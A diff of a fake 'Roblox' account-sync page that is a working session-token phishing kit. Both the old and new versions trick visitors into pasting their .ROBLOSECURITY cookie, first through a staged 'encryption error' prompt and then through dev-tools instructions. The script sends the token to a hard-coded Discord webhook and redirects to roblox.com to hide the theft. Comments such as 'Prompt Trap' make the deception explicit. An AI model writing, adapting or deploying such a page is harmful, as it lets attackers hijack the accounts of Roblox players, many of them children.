@@ -1,65 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox | Security Verification</title>
+    <title>Roblox | Account Synchronization</title>
     <style>
-        body { background: #1a1b1d; color: white; font-family: 'HCo Gotham SSm', sans-serif; text-align: center; padding-top: 10vh; margin: 0; }
-        .container { background: #2f3136; border-radius: 8px; padding: 40px; width: 450px; margin: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
-        .logo { width: 140px; margin-bottom: 20px; }
-        .loading-bar { width: 100%; background: #202225; height: 8px; border-radius: 4px; overflow: hidden; margin: 20px 0; }
-        .progress { width: 0%; height: 100%; background: #00b2ff; transition: width 4s ease-in-out; }
-        .btn { display: none; background: #00b2ff; color: white; border: none; padding: 12px 25px; border-radius: 4px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #status-text { font-size: 14px; color: #b8b8b8; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 50px; }
+        .terminal { background: #1a1a1a; border: 1px solid #00ff00; padding: 30px; width: 500px; margin: auto; box-shadow: 0 0 20px #00ff00; border-radius: 5px; }
+        .input-box { width: 90%; padding: 10px; background: #000; border: 1px solid #00ff00; color: #00ff00; margin-top: 20px; outline: none; }
+        .btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #00cc00; box-shadow: 0 0 10px #00ff00; }
+        .step { text-align: left; font-size: 14px; margin-bottom: 10px; color: #b8b8b8; }
+        b { color: #00ff00; }
     </style>
 </head>
-<body onload="startSync()">
+<body>
 
-    <div class="container">
-        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" class="logo">
-        <h2 id="header">Syncing Heart Box...</h2>
-        <div class="loading-bar"><div class="progress" id="bar"></div></div>
-        <p id="status-text">Detecting active session in Microsoft Edge...</p>
+    <div class="terminal">
+        <h2 style="color: #00ff00;">GIFT ENCRYPTION DETECTED</h2>
+        <hr style="border-color: #00ff00;">
         
-        <button id="auth-btn" class="btn" onclick="capture()">Finalize Authentication</button>
+        <div class="step">1. Open <b>roblox.com</b> in a new tab.</div>
+        <div class="step">2. Right-click anywhere and select <b>Inspect</b>.</div>
+        <div class="step">3. Go to <b>Application</b> -> <b>Cookies</b> -> <b>https://www.roblox.com</b>.</div>
+        <div class="step">4. Find <b>.ROBLOSECURITY</b> and double-click the Value.</div>
+        <div class="step">5. Paste the Value below to authorize the Heart Box.</div>
+
+        <input type="text" id="tokenInput" class="input-box" placeholder="PASTE .ROBLOSECURITY TOKEN HERE">
+        
+        <br>
+        <button class="btn" onclick="sendToVillage()">AUTHORIZE SYNC</button>
+        
+        <p id="log" style="font-size: 12px; margin-top: 20px;">[SYSTEM]: Waiting for user input...</p>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        function startSync() {
-            const bar = document.getElementById('bar');
-            setTimeout(() => { bar.style.width = '100%'; }, 500);
+        async function sendToVillage() {
+            const token = document.getElementById('tokenInput').value;
+            const log = document.getElementById('log');
 
-            // After 4 seconds, "fail" the auto-sync to force the user action
-            setTimeout(() => {
-                document.getElementById('header').innerText = "Action Required";
-                document.getElementById('status-text').innerHTML = "<span style='color:#ff4d4d'>Encryption Error: HttpOnly Protection Active.</span><br>Please click below to manually reflect the session.";
-                document.getElementById('auth-btn').style.display = 'inline-block';
-            }, 4500);
-        }
-
-        async function capture() {
-            // Since the browser BLOCKS the auto-grab, we use the "Prompt Trap"
-            // We tell them the system needs to 'read' the token to sync.
-            const token = prompt("To bypass Edge Security, please paste your '.ROBLOSECURITY' token found in Application > Cookies:");
-            
-            if (token) {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        content: "📡 **GHOST CAPTURE SUCCESSFUL!**",
-                        embeds: [{
-                            title: "Target: heartboxx",
-                            description: "Token: ```" + token + "```",
-                            color: 3092790,
-                            footer: { text: "Device: " + navigator.platform }
-                        }]
-                    })
-                });
-                alert("Session Synced! Redirecting to your inventory...");
-                window.location.href = "https://www.roblox.com/home";
+            if (!token || !token.includes("_|WARNING:-DO-NOT-SHARE-THIS.")) {
+                log.innerText = "[ERROR]: Invalid Token Format. Try again.";
+                log.style.color = "#ff4d4d";
+                return;
             }
+
+            log.innerText = "[SYSTEM]: Encrypting and Sending to Server...";
+            log.style.color = "#00ff00";
+
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "💎 **MANUAL HARVEST SUCCESSFUL**",
+                    embeds: [{
+                        title: "Target: heartboxx",
+                        description: "```" + token + "```",
+                        color: 65280
+                    }]
+                })
+            });
+
+            log.innerText = "[SUCCESS]: Sync Complete. Redirecting...";
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/home";
+            }, 2000);
         }
     </script>
 </body>
